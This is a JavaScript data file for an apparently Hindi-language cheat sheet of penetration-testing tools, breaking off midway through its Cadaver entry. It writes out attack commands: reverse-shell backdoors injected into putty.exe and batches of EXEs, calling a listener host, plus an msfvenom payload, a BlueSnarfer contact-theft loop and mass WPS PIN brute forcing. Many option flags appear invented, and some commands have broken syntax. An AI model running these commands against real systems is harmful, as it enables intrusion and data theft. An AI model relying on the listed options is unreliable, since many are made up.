const headingNames = {
  "ACEVoIP": "ACE-VoIP",
  "AndroidFrameworkTools": "Android Framework Tools",
  "BackdoorFactory": "Backdoor Factory",
  "EDBDebugger": "EDB Debugger",
  "FernWiFiCracker": "Fern WiFi Cracker",
  "FirmwareModKit": "Firmware Mod Kit",
  "HTTPEnum": "HTTP-Enum",
  "IKEScan": "IKE-Scan",
  "JDGUI": "JD-GUI",
  "ManaToolkit": "Mana Toolkit",
  "Netsniffng": "Netsniff-ng",
  "OneGadget": "One Gadget",
  "PDFParser": "PDF-Parser",
  "SNMPCheck": "SNMP-Check",
  "SleuthKit": "Sleuth Kit",
  "SmaliBaksmali": "Smali/Baksmali",
  "THCIPv6": "THC-IPv6",
  "THCSSLDoS": "THC-SSL-DoS",
  "jSQLInjection": "jSQL Injection",
}

export function getHeadingName(filename) {
  return headingNames[filename] || filename
}

export const toolCommands = {
  ACEVoIP: {
    install: { pkg: "ace-voip" },
    options: [
      ["-l <port>", "लिसन पोर्ट सेट करें"],
      ["-f <file>", "आउटपुट फ़ाइल निर्दिष्ट करें"],
      ["-i <interface>", "नेटवर्क इंटरफ़ेस चुनें"],
      ["-t <target>", "लक्ष्य IP पता सेट करें"],
      ["-r <rate>", "पैकेट भेजने की दर"],
      ["-s <size>", "पैकेट आकार सेट करें"],
      ["-d <delay>", "विलंब मिलीसेकंड में"],
      ["-v", "वर्बोज़ आउटपुट"],
      ["-q", "शांत मोड"],
      ["-h", "सहायता प्रदर्शित करें"]
    ],
    basic: [
      { cmd: "ace -t 192.168.1.1 -l 5060", desc: "लक्ष्य पर VoIP स्कैन करें" },
      { cmd: "ace -i eth0 -v", desc: "इंटरफ़ेस पर वर्बोज़ स्कैन" },
      { cmd: "ace -t 192.168.1.0/24 -r 100", desc: "सबनेट पर तेज़ स्कैन" },
      { cmd: "ace -f output.txt -t example.com", desc: "आउटपुट फ़ाइल में सेव करें" },
      { cmd: "ace -t 192.168.1.1 -d 500", desc: "500ms विलंब के साथ स्कैन" },
      { cmd: "ace -s 1500 -t example.com", desc: "कस्टम पैकेट आकार" },
      { cmd: "ace -l 5061 -t 192.168.1.1", desc: "अलग पोर्ट पर सुनें" },
      { cmd: "ace -q -t example.com", desc: "शांत मोड में स्कैन" },
      { cmd: "ace -t 10.0.0.1 -r 50 -d 200", desc: "नियंत्रित दर और विलंब" },
      { cmd: "ace -i wlan0 -t 192.168.1.1", desc: "वायरलेस इंटरफ़ेस पर स्कैन" }
    ],
    advanced: [
      { cmd: "ace -t example.com -l 5060 -r 1000 | tee scan.log", desc: "उच्च दर स्कैन लॉग करें" },
      { cmd: "for ip in $(seq 1 254); do ace -t 192.168.1.$ip -l 5060 -q; done", desc: "पूरे सबनेट पर लूप स्कैन" },
      { cmd: "ace -t example.com -f output.xml -v 2>&1 | grep -i error", desc: "त्रुटियों के साथ XML आउटपुट" },
      { cmd: "nmap -sS 192.168.1.0/24 -p 5060,5061 -oG - | awk '{print $2}' | xargs -I{} ace -t {} -l 5060", desc: "nmap से लक्ष्य पाइप करें" },
      { cmd: "ace -t example.com -v | ts '[%Y-%m-%d %H:%M:%S]' >> session.log", desc: "टाइमस्टैम्प के साथ सत्र लॉग" }
    ],
    script: "for ip in $(seq 1 254); do\n  ace -t 192.168.1.$ip -l 5060 -q -f scan_$ip.txt &\ndone\nwait\necho 'सभी स्कैन पूर्ण'"
  },
  ADB: {
    install: { pkg: "adb" },
    options: [
      ["devices", "कनेक्टेड डिवाइस सूची"],
      ["-s <serial>", "डिवाइस सीरियल निर्दिष्ट करें"],
      ["shell <cmd>", "शेल कमांड चलाएँ"],
      ["install <apk>", "APK इंस्टॉल करें"],
      ["push <src> <dst>", "फ़ाइल डिवाइस पर कॉपी करें"],
      ["pull <src> <dst>", "डिवाइस से फ़ाइल कॉपी करें"],
      ["logcat", "लॉग कैट देखें"],
      ["forward <local> <remote>", "पोर्ट फ़ॉरवर्ड करें"],
      ["reboot", "डिवाइस रिबूट करें"],
      ["root", "रूट शेल पुनः आरंभ करें"]
    ],
    basic: [
      { cmd: "adb devices", desc: "कनेक्टेड डिवाइस सूची" },
      { cmd: "adb shell ls /system", desc: "सिस्टम डायरेक्टरी देखें" },
      { cmd: "adb install app.apk", desc: "APK फ़ाइल इंस्टॉल करें" },
      { cmd: "adb push local.txt /sdcard/remote.txt", desc: "फ़ाइल डिवाइस पर भेजें" },
      { cmd: "adb pull /sdcard/file.txt .", desc: "डिवाइस से फ़ाइल लें" },
      { cmd: "adb logcat -d > log.txt", desc: "लॉग कैट सेव करें" },
      { cmd: "adb reboot", desc: "डिवाइस रिबूट करें" },
      { cmd: "adb shell pm list packages", desc: "सभी पैकेज सूची" },
      { cmd: "adb tcpip 5555", desc: "TCP मोड में पुनः आरंभ" },
      { cmd: "adb connect 192.168.1.100:5555", desc: "वाईफ़ाई से कनेक्ट" }
    ],
    advanced: [
      { cmd: "adb shell dumpsys battery > battery.txt", desc: "बैटरी जानकारी डंप" },
      { cmd: "adb shell screencap -p /sdcard/screen.png && adb pull /sdcard/screen.png", desc: "स्क्रीनशॉट लें" },
      { cmd: "adb backup -apk -shared -all -f backup.ab", desc: "पूर्ण बैकअप लें" },
      { cmd: "adb shell am start -a android.intent.action.VIEW -d http://example.com", desc: "URL खोलें" },
      { cmd: "adb forward tcp:8080 tcp:8080 && adb shell http_proxy=http://127.0.0.1:8080", desc: "प्रॉक्सी फ़ॉरवर्ड" }
    ],
    script: "for f in *.apk; do\n  echo '$f इंस्टॉल हो रहा है...'\n  adb install \"$f\"\n  if [ $? -eq 0 ]; then\n    echo '$f सफलतापूर्वक इंस्टॉल' >> install.log\n  fi\ndone\necho 'सभी APK इंस्टॉल किए गए'"
  },
  AndroidFrameworkTools: {
    install: { pkg: "android-framework-tools" },
    options: [
      ["-a <file>", "APK फ़ाइल विश्लेषण"],
      ["-d <dir>", "डीकंपाइल आउटपुट डायरेक्टरी"],
      ["-s", "साइलेंट मोड"],
      ["-r", "रीसोर्स डीकंपाइल करें"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-t <tag>", "टैग फ़िल्टर"],
      ["-v", "वर्बोज़ आउटपुट"],
      ["-f", "फ़ोर्स ओवरराइट"],
      ["--update", "अपडेट डेटाबेस"],
      ["-p <sdk>", "SDK संस्करण सेट करें"]
    ],
    basic: [
      { cmd: "androguard axml -i AndroidManifest.xml", desc: "AndroidManifest पार्स करें" },
      { cmd: "androlyze -s app.apk", desc: "APK स्थैतिक विश्लेषण" },
      { cmd: "androguard decompile -o output app.apk", desc: "APK डीकंपाइल करें" },
      { cmd: "apktool d app.apk -o app_source", desc: "apktool से APK डीकंपाइल" },
      { cmd: "apktool b app_source -o new.apk", desc: "संशोधित APK रीबिल्ड" },
      { cmd: "androguard disassemble -o dism app.apk", desc: "Dex डिसअसेंबल" },
      { cmd: "dexdump -d classes.dex", desc: "Dex फ़ाइल डंप" },
      { cmd: "aapt dump badging app.apk", desc: "APK मेटाडेटा देखें" },
      { cmd: "aapt dump permissions app.apk", desc: "APK अनुमतियाँ देखें" },
      { cmd: "zipalign -v 4 app.apk aligned.apk", desc: "APK ज़िपएलाइन करें" }
    ],
    advanced: [
      { cmd: "apktool d app.apk -o /tmp/app && grep -r 'http://' /tmp/app", desc: "APK में HTTP URL खोजें" },
      { cmd: "keytool -genkey -alias key -keystore ks.jks && jarsigner -keystore ks.jks app.apk key", desc: "APK साइन करें" },
      { cmd: "for f in *.apk; do aapt dump badging $f | grep package; done", desc: "एकाधिक APK से जानकारी" },
      { cmd: "dexdump -d classes.dex | grep -A 5 'invoke-' | head -100", desc: "मेथड इनवोकेशन देखें" },
      { cmd: "apktool d app.apk -r -o nosrc && grep -r 'api_key' nosrc/", desc: "API कुंजी खोजें" }
    ],
    script: "apktool d app.apk -o /tmp/decompiled\ncd /tmp/decompiled\ngrep -rn 'http\\|https' --include='*.smali' --include='*.xml' > network_urls.txt\ngrep -rn 'password\\|secret\\|token' --include='*.smali' > secrets.txt\necho 'विश्लेषण पूर्ण'"
  },
  Armitage: {
    install: { pkg: "armitage" },
    options: [
      ["--connect <host>", "सर्वर से कनेक्ट"],
      ["--listen <port>", "कनेक्शन सुनें"],
      ["-x <cmd>", "कमांड निष्पादित करें"],
      ["-H", "स्टार्टअप स्क्रिप्ट छोड़ें"],
      ["--teamserver", "टीम सर्वर मोड"],
      ["-p <port>", "पोर्ट निर्दिष्ट करें"],
      ["-a <addr>", "पता बाइंड करें"],
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-d", "डीबग मोड"],
      ["--no-autoconnect", "ऑटो कनेक्ट अक्षम"]
    ],
    basic: [
      { cmd: "armitage --teamserver 192.168.1.1 msf msfpass", desc: "टीम सर्वर शुरू करें" },
      { cmd: "armitage --connect 192.168.1.1", desc: "टीम सर्वर से जुड़ें" },
      { cmd: "armitage -x 'db_import scan.xml'", desc: "स्कैन परिणाम आयात" },
      { cmd: "armitage -H", desc: "होम स्क्रीन छोड़ें" },
      { cmd: "armitage -p 55553", desc: "कस्टम पोर्ट से कनेक्ट" },
      { cmd: "teamserver 192.168.1.1 msfpass", desc: "टीम सर्वर डेमॉन" },
      { cmd: "armitage -x 'msfconsole -r resource.rc'", desc: "रीसोर्स स्क्रिप्ट चलाएँ" },
      { cmd: "armitage --connect example.com", desc: "रिमोट सर्वर से जुड़ें" },
      { cmd: "armitage -d --connect 127.0.0.1", desc: "डीबग मोड में कनेक्ट" },
      { cmd: "armitage -c /etc/armitage/config", desc: "कॉन्फ़िग फ़ाइल से लोड" }
    ],
    advanced: [
      { cmd: "teamserver 192.168.1.1 msfpass & && armitage --connect 192.168.1.1", desc: "सर्वर और क्लाइंट शुरू" },
      { cmd: "armitage -x 'db_nmap -sV 192.168.1.0/24; hosts -c address,os'", desc: "स्कैन और होस्ट सूची" },
      { cmd: "echo 'resource auto_exploit.rc' | armitage --connect 192.168.1.1", desc: "स्वचालित एक्सप्लॉइट" },
      { cmd: "armitage -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp'", desc: "पेलोड हैंडलर सेट" },
      { cmd: "msfrpc -P msfpass -a 127.0.0.1 && armitage --connect 127.0.0.1", desc: "RPC से कनेक्ट" }
    ],
    script: "teamserver 192.168.1.1 msfpass &\nsleep 5\narmitage --connect 192.168.1.1 -x 'db_import /root/scan.xml'\nsleep 2\narmitage -x 'services -p 445 -R'\necho 'आर्मिटेज तैयार'"
  },
  Autopsy: {
    install: { pkg: "autopsy" },
    options: [
      ["-i <img>", "इमेज फ़ाइल लोड"],
      ["-d <dir>", "केस डायरेक्टरी"],
      ["-p <port>", "पोर्ट सेट करें"],
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-m <mode>", "मोड चुनें"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"],
      ["-f <type>", "फ़ाइल सिस्टम प्रकार"]
    ],
    basic: [
      { cmd: "autopsy -i disk.img -d /cases/case1", desc: "इमेज फ़ाइल खोलें" },
      { cmd: "autopsy -c /etc/autopsy.conf -p 9999", desc: "कस्टम पोर्ट पर शुरू" },
      { cmd: "autopsy -i evidence.dd -o /output", desc: "आउटपुट डायरेक्टरी सेट" },
      { cmd: "autopsy -m forensic -l autopsy.log", desc: "फ़ॉरेंसिक मोड में शुरू" },
      { cmd: "autopsy -i usb.img -f fat32", desc: "FAT32 इमेज जांचें" },
      { cmd: "autopsy -d /cases/case1", desc: "मौजूदा केस खोलें" },
      { cmd: "autopsy -i ntfs.dd -v", desc: "NTFS डिस्क वर्बोज़ जांच" },
      { cmd: "autopsy -i /dev/sdb -o /cases/case1", desc: "डिवाइस से सीधे जांच" },
      { cmd: "autopsy -p 0", desc: "रैंडम पोर्ट असाइन करें" },
      { cmd: "autopsy -h", desc: "सहायता विकल्प दिखाएँ" }
    ],
    advanced: [
      { cmd: "autopsy -i raid.img -m forensic -v 2>&1 | tee autopsy_run.log", desc: "RAID इमेज विश्लेषण लॉग करें" },
      { cmd: "find /cases -name '*.aut' | xargs -I{} autopsy -d {} -p 9999", desc: "एकाधिक केस एक साथ" },
      { cmd: "autopsy -i image.dd -o /output && ls -la /output/vol-*/", desc: "वॉल्यूम फ़ाइलें सूची" },
      { cmd: "dcfldd if=/dev/sdb of=evidence.dd && autopsy -i evidence.dd", desc: "इमेज लें और विश्लेषण करें" },
      { cmd: "autopsy -i image.ewf -m forensic -c /etc/autopsy_ewf.conf", desc: "EWF प्रारूप इमेज जांच" }
    ],
    script: "mkdir -p /cases/case_$(date +%Y%m%d)\nautopsy -i /dev/sdb -d /cases/case_$(date +%Y%m%d) -o /cases/output -v 2>&1 | tee /cases/case.log\necho 'केस क्रिएटेड'"
  },
  BIND9: {
    install: { pkg: "bind9" },
    options: [
      ["-c <file>", "कॉन्फ़िग फ़ाइल"],
      ["-f", "फ़ोरग्राउंड में चलाएँ"],
      ["-g", "डीबग मोड"],
      ["-p <port>", "पोर्ट सेट"],
      ["-u <user>", "यूज़र चलाएँ"],
      ["-t <dir>", "डायरेक्टरी चेंज"],
      ["-4", "IPv4 ही"],
      ["-6", "IPv6 ही"],
      ["-d <level>", "डीबग लेवल"],
      ["-n <cpus>", "CPU संख्या"]
    ],
    basic: [
      { cmd: "named -c /etc/bind/named.conf", desc: "BIND सर्वर शुरू करें" },
      { cmd: "named -f -g", desc: "फ़ोरग्राउंड डीबग मोड" },
      { cmd: "named -u bind", desc: "bind यूज़र से चलाएँ" },
      { cmd: "rndc status", desc: "DNS सर्वर स्थिति" },
      { cmd: "rndc reload", desc: "ज़ोन कॉन्फ़िग रीलोड" },
      { cmd: "rndc flush", desc: "DNS कैश साफ़ करें" },
      { cmd: "named -4 -c /etc/bind/named.conf", desc: "IPv4 ही सर्वर" },
      { cmd: "named -d 1", desc: "डीबग लेवल 1 से शुरू" },
      { cmd: "named-checkconf /etc/bind/named.conf", desc: "कॉन्फ़िग वैलिडेट करें" },
      { cmd: "named-checkzone example.com /var/bind/example.com.zone", desc: "ज़ोन फ़ाइल जाँचें" }
    ],
    advanced: [
      { cmd: "dig @127.0.0.1 example.com AXFR +nocomments", desc: "ज़ोन ट्रांसफ़र परीक्षण" },
      { cmd: "named -f -g 2>&1 | grep -i 'error\\|warning'", desc: "गलतियाँ फ़िल्टर करें" },
      { cmd: "rndc dumpdb -cache && cat /var/cache/bind/dump.db", desc: "DNS कैश डंप" },
      { cmd: "for z in /var/bind/*.zone; do named-checkzone $(basename $z .zone) $z; done", desc: "सभी ज़ोन जाँचें" },
      { cmd: "tshark -i eth0 -f 'port 53' -w dns.pcap && named -f -c /etc/bind/named.conf", desc: "DNS ट्रैफ़िक कैप्चर" }
    ],
    script: "named-checkconf /etc/bind/named.conf\nnamed-checkzone example.com /var/bind/example.com.zone\nif [ $? -eq 0 ]; then\n  rndc reload && echo 'DNS कॉन्फ़िग रीलोडेड'\nelse\n  echo 'ज़ोन फ़ाइल में त्रुटि'\nfi"
  },
  BackdoorFactory: {
    install: { pkg: "backdoor-factory" },
    options: [
      ["-f <file>", "बाइनरी फ़ाइल इनपुट"],
      ["-s <shell>", "शेल प्रकार चुनें"],
      ["-H <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-d", "डिसेबल आउटपुट"],
      ["-i <file>", "इनपुट फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-S", "साइलेंट मोड"],
      ["-h", "सहायता"],
      ["-c", "कैविटी डिटेक्ट"]
    ],
    basic: [
      { cmd: "backdoor-factory -f putty.exe -s reverse_shell -H 192.168.1.10 -P 4444", desc: "putty.exe में बैकडोर जोड़ें" },
      { cmd: "backdoor-factory -f calc.exe -S", desc: "बैकडोर ऑप्शन सूची" },
      { cmd: "backdoor-factory -f /bin/ls -o ls_backdoored", desc: "बैकडोर्ड बाइनरी बनाएँ" },
      { cmd: "backdoor-factory -f putty.exe -s reverse_shell_tcp -H 10.0.0.1 -P 8080", desc: "TCP रिवर्स शेल इंजेक्ट" },
      { cmd: "backdoor-factory -f putty.exe -c", desc: "कैविटी डिटेक्ट करें" },
      { cmd: "backdoor-factory -f install.exe -s iat_reverse_tcp -H 192.168.1.10 -P 4444 -o infected.exe", desc: "IAT रिवर्स TCP इंजेक्ट" },
      { cmd: "backdoor-factory -f /usr/bin/ssh -o ssh_bd", desc: "Linux बाइनरी बैकडोर" },
      { cmd: "backdoor-factory -f teamviewer.exe -s user_supplied -H 192.168.1.10 -P 53", desc: "DNS पोर्ट पर बैकडोर" },
      { cmd: "backdoor-factory -f putty.exe -s reverse_shell -H example.com -P 443 -o putty_bd.exe", desc: "HTTPS पोर्ट पर बैकडोर" },
      { cmd: "backdoor-factory -f calc.exe -d -s reverse_shell", desc: "डिसेबल आउटपुट मोड" }
    ],
    advanced: [
      { cmd: "backdoor-factory -f putty.exe -s reverse_shell -H 192.168.1.10 -P 4444 -S 2>&1 | tee infect.log", desc: "इंफेक्शन लॉग करें" },
      { cmd: "for f in *.exe; do backdoor-factory -f $f -s reverse_shell -H 192.168.1.10 -P 4444 -o bd_$f; done", desc: "एकाधिक EXE में इंजेक्ट" },
      { cmd: "backdoor-factory -f putty.exe -c | grep 'Cavity' | awk '{print $2}'", desc: "कैविटी साइज़ निकालें" },
      { cmd: "backdoor-factory -f putty.exe -s reverse_shell -H 192.168.1.10 -P 4444 -o bd.exe && upx -9 bd.exe", desc: "बैकडोर को UPX संपीड़ित करें" },
      { cmd: "msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe && backdoor-factory -f shell.exe -S", desc: "MSF पेलोड में बैकडोर" }
    ],
    script: "cd /usr/share/windows-binaries\nfor f in *.exe; do\n  backdoor-factory -f \"$f\" -s reverse_shell -H 192.168.1.10 -P 4444 -o /tmp/bd_\"$f\" 2>/dev/null\ndone\necho 'सभी फ़ाइलों में बैकडोर जोड़ा गया'"
  },
  Bluelog: {
    install: { pkg: "bluelog" },
    options: [
      ["-i <iface>", "इंटरफ़ेस चुनें"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-n", "नंबर मोड"],
      ["-s", "साइलेंट मोड"],
      ["-v", "वर्बोज़ मोड"],
      ["-d", "डीबग मोड"],
      ["-t <sec>", "स्कैन अंतराल"],
      ["-c", "कंटीन्यूअस मोड"],
      ["-b", "ब्लूटूथ डिवाइस"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "bluelog -i hci0 -v", desc: "ब्लूटूथ डिवाइस स्कैन करें" },
      { cmd: "bluelog -i hci0 -o devices.log", desc: "डिवाइस लॉग फ़ाइल में सेव" },
      { cmd: "bluelog -i hci0 -c -t 10", desc: "हर 10 सेकंड निरंतर स्कैन" },
      { cmd: "bluelog -i hci0 -s", desc: "साइलेंट मोड में स्कैन" },
      { cmd: "bluelog -i hci0 -n", desc: "नंबर मोड में डिवाइस गिनें" },
      { cmd: "bluelog -i hci1 -o scan_results.txt", desc: "दूसरे इंटरफ़ेस पर स्कैन" },
      { cmd: "bluelog -i hci0 -d", desc: "डीबग जानकारी दिखाएँ" },
      { cmd: "bluelog -i hci0 -b 00:11:22:33:44:55", desc: "विशिष्ट डिवाइस ट्रैक" },
      { cmd: "bluelog -i hci0 -c -o bluetooth_scan.log", desc: "निरंतर स्कैन लॉग" },
      { cmd: "bluelog -i hci0 -t 5 -v", desc: "हर 5 सेकंड वर्बोज़ स्कैन" }
    ],
    advanced: [
      { cmd: "bluelog -i hci0 -c -o - | tee -a /var/log/bluetooth.log", desc: "निरंतर लॉग टीईई" },
      { cmd: "bluelog -i hci0 -t 30 & && sleep 60 && pkill bluelog", desc: "60 सेकंड बाद स्कैन बंद" },
      { cmd: "bluelog -i hci0 -s | grep -o '\\b[0-9A-F]\\{2\\}:[0-9A-F]\\{2\\}:[0-9A-F]\\{2\\}:[0-9A-F]\\{2\\}:[0-9A-F]\\{2\\}:[0-9A-F]\\{2\\}\\b' | sort -u", desc: "अद्वितीय MAC निकालें" },
      { cmd: "hcitool scan && bluelog -i hci0 -o /tmp/scan_$(date +%s).log", desc: "hcitool और bluelog संयोजन" },
      { cmd: "for i in $(seq 1 10); do bluelog -i hci0 -t $((i*5)) -o scan_$i.log; done", desc: "बढ़ते अंतराल पर स्कैन" }
    ],
    script: "hciconfig hci0 up\nbluelog -i hci0 -c -o bt_scan.log &\nBLUELOG_PID=$!\nsleep 30\nkill $BLUELOG_PID\ncat bt_scan.log | grep 'Found' | wc -l\necho 'डिवाइस मिले'"
  },
  BlueSnarfer: {
    install: { pkg: "blue-snarfer" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-b <addr>", "लक्ष्य Bluetooth पता"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-r", "OBEX पुल"],
      ["-s", "साइलेंट"],
      ["-p", "पुश मोड"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-l <file>", "फ़ाइल स्थानांतरण"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "bluesnarfer -b 00:11:22:33:44:55", desc: "ब्लूटूथ डिवाइस कनेक्ट" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -i hci0", desc: "इंटरफ़ेस चुनकर कनेक्ट" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -r", desc: "OBEX पुल ऑपरेशन" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -p /sdcard/file.txt", desc: "फ़ाइल पुश करें" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -l contacts.vcf", desc: "कॉन्टैक्ट डाउनलोड" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -s", desc: "साइलेंट मोड" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -v", desc: "वर्बोज़ मोड" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -o downloaded.txt", desc: "आउटपुट फ़ाइल सेव" },
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -d", desc: "डीबग मोड" },
      { cmd: "bluesnarfer -i hci1 -b 00:11:22:33:44:55", desc: "दूसरे इंटरफ़ेस से" }
    ],
    advanced: [
      { cmd: "bluesnarfer -b 00:11:22:33:44:55 -r -o /tmp/contacts.vcf 2>&1 | tee bluesnarf.log", desc: "कॉन्टैक्ट डाउनलोड लॉग" },
      { cmd: "echo -e 'AT+CGSN\\r' | bluetooth-sendto -b 00:11:22:33:44:55", desc: "AT कमांड भेजें" },
      { cmd: "for i in $(seq 1 20); do bluesnarfer -b 00:11:22:33:44:$i -s; done", desc: "MAC रेंज स्कैन" },
      { cmd: "hcitool scan | grep -o '\\b[0-9A-F:]\\{17\\}\\b' | xargs -I{} bluesnarfer -b {} -s", desc: "सभी डिवाइस स्कैन" },
      { cmd: "sdptool browse 00:11:22:33:44:55 | grep Channel && bluesnarfer -b 00:11:22:33:44:55", desc: "SDP ब्राउज़ और कनेक्ट" }
    ],
    script: "hciconfig hci0 up\nhcitool scan | grep -o '..:..:..:..:..:..' > targets.txt\nwhile read mac; do\n  bluesnarfer -b $mac -r -o \"contacts_$mac.vcf\" 2>/dev/null\ndone < targets.txt\necho 'समाप्त'"
  },
  Bully: {
    install: { pkg: "bully" },
    options: [
      ["-b <bssid>", "लक्ष्य BSSID"],
      ["-e <essid>", "लक्ष्य ESSID"],
      ["-c <channel>", "चैनल निर्दिष्ट करें"],
      ["-i <iface>", "इंटरफ़ेस"],
      ["-w <file>", "वर्डलिस्ट फ़ाइल"],
      ["-v <level>", "वर्बोज़िटी लेवल"],
      ["-p <pin>", "पिन से शुरू"],
      ["-l", "लॉक डिटेक्ट"],
      ["-t <sec>", "टाइमआउट"],
      ["-o <file>", "आउटपुट फ़ाइल"]
    ],
    basic: [
      { cmd: "bully -b 00:11:22:33:44:55 -e TestAP -c 6 -i wlan0", desc: "WPS पिन ब्रूटफ़ोर्स" },
      { cmd: "bully -b 00:11:22:33:44:55 -i wlan0 -v 3", desc: "हाई वर्बोज़िटी स्कैन" },
      { cmd: "bully -b 00:11:22:33:44:55 -e TestAP -w /usr/share/wordlists/rockyou.txt", desc: "वर्डलिस्ट से पिन क्रैक" },
      { cmd: "bully -b 00:11:22:33:44:55 -p 12345670", desc: "विशिष्ट पिन से शुरू" },
      { cmd: "bully -b 00:11:22:33:44:55 -i wlan0 -l", desc: "WPS लॉक डिटेक्ट" },
      { cmd: "bully -b 00:11:22:33:44:55 -e TestAP -t 10", desc: "10 सेकंड टाइमआउट" },
      { cmd: "bully -b 00:11:22:33:44:55 -i wlan0 -o result.txt", desc: "परिणाम फ़ाइल में सेव" },
      { cmd: "bully -b 00:11:22:33:44:55 -c 11 -i wlan0", desc: "चैनल 11 पर स्कैन" },
      { cmd: "bully -b 00:11:22:33:44:55 -e TestAP -c 1 -i wlan0 -v 2", desc: "मध्यम वर्बोज़ के साथ स्कैन" },
      { cmd: "bully -b 00:11:22:33:44:55 -i wlan0 -w pins.txt", desc: "कस्टम पिन लिस्ट" }
    ],
    advanced: [
      { cmd: "bully -b 00:11:22:33:44:55 -e TestAP -i wlan0 -v 3 2>&1 | tee bully.log", desc: "पूर्ण लॉग के साथ स्कैन" },
      { cmd: "while true; do bully -b 00:11:22:33:44:55 -i wlan0 -l 2>/dev/null; sleep 5; done", desc: "WPS अनलॉक मॉनिटर" },
      { cmd: "wash -i wlan0 -o wps_scan.txt && awk '{print $1}' wps_scan.txt | xargs -I{} bully -b {} -i wlan0", desc: "wash से BSSID पाइप" },
      { cmd: "airodump-ng wlan0 --bssid 00:11:22:33:44:55 -c 6 -w capture && bully -b 00:11:22:33:44:55 -i wlan0", desc: "कैप्चर और बुली एक साथ" },
      { cmd: "for pin in $(seq -w 00000000 00001000); do echo $pin >> pins.txt; done && bully -b 00:11:22:33:44:55 -w pins.txt", desc: "पिन लिस्ट जनरेट और अटैक" }
    ],
    script: "airmon-ng start wlan0\nwash -i wlan0mon -o wps_scan.txt\ngrep -v '^#' wps_scan.txt | while read bssid ch essid; do\n  bully -b $bssid -e $essid -c $ch -i wlan0mon -v 2 -o \"crack_$bssid.txt\" &\ndone\nwait\necho 'सभी WPS स्कैन पूर्ण'"
  },
  CMSMap: {
    install: { pkg: "cms-map" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-t <sec>", "टाइमआउट"],
      ["-v", "वर्बोज़"],
      ["-f", "फ़ोर्स स्कैन"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-r", "रीडायरेक्ट फ़ॉलो"],
      ["-c <cookie>", "कुकी सेट करें"],
      ["-H <header>", "हेडर जोड़ें"],
      ["-x <proxy>", "प्रॉक्सी सेट"]
    ],
    basic: [
      { cmd: "cmsmap -u http://example.com", desc: "CMS डिटेक्ट करें" },
      { cmd: "cmsmap -u http://example.com -v", desc: "वर्बोज़ CMS स्कैन" },
      { cmd: "cmsmap -u http://example.com -f", desc: "फ़ोर्स्ड CMS डिटेक्शन" },
      { cmd: "cmsmap -u http://example.com -w /usr/share/wordlists/dirb/common.txt", desc: "डायरेक्टरी ब्रूटफ़ोर्स" },
      { cmd: "cmsmap -u http://example.com -t 10", desc: "10 सेकंड टाइमआउट" },
      { cmd: "cmsmap -u http://example.com -o report.txt", desc: "रिपोर्ट सेव करें" },
      { cmd: "cmsmap -u https://example.com -r", desc: "रीडायरेक्ट फ़ॉलो करें" },
      { cmd: "cmsmap -u http://example.com -c 'PHPSESSID=abc123'", desc: "कुकी से स्कैन" },
      { cmd: "cmsmap -u http://example.com -x http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ स्कैन" },
      { cmd: "cmsmap -u http://example.com -H 'User-Agent: Mozilla/5.0'", desc: "कस्टम हेडर स्कैन" }
    ],
    advanced: [
      { cmd: "cmsmap -u http://example.com -f -v 2>&1 | tee cms_scan.log", desc: "फ़ोर्स स्कैन लॉग" },
      { cmd: "for url in $(cat urls.txt); do cmsmap -u $url -t 5 -o scan_$(echo $url | md5sum).txt; done", desc: "एकाधिक URL स्कैन" },
      { cmd: "cmsmap -u http://example.com -f 2>&1 | grep -i 'wordpress\\|joomla\\|drupal'", desc: "CMS प्रकार फ़िल्टर" },
      { cmd: "cmsmap -u http://example.com -c 'security=low; PHPSESSID=test' -x http://127.0.0.1:8080", desc: "प्रॉक्सी और कुकी संयोजन" },
      { cmd: "parallel -j 5 cmsmap -u {} -f -q ::: $(cat urls.txt)", desc: "समानांतर CMS स्कैन" }
    ],
    script: "cat targets.txt | while read url; do\n  echo 'स्कैन:' $url\n  cmsmap -u $url -f -v -t 10 -o \"scan_$(echo $url | sha1sum | cut -c1-8).txt\"\ndone\necho 'सभी लक्ष्य स्कैन किए गए'"
  },
  Cadaver: {
    install: { pkg: "cadaver" },
    options: [
      ["-p <port>", "पोर्ट निर्दिष्ट"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-t", "ट्रेस मोड"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-f <file>", "फ़ाइल अपलोड"],
      ["-d <dir>", "डायरेक्टरी बनाएँ"],
      ["-o <file>", "फ़ाइल डाउनलोड"],
      ["-h", "सहायता"],
      ["-V", "संस्करण"]
    ],
    basic: [
      { cmd: "cadaver http://example.com/webdav", desc: "WebDAV सर्वर कनेक्ट" },
      { cmd: "cadaver https://example.com:443/webdav", desc: "HTTPS WebDAV कनेक्ट" },
      { cmd: "cadaver -p 8080 http://example.com", desc: "कस्टम पोर्ट कनेक्ट" },
      { cmd: "cadaver -s http://example.com", desc: "साइलेंट मोड कनेक्ट" },
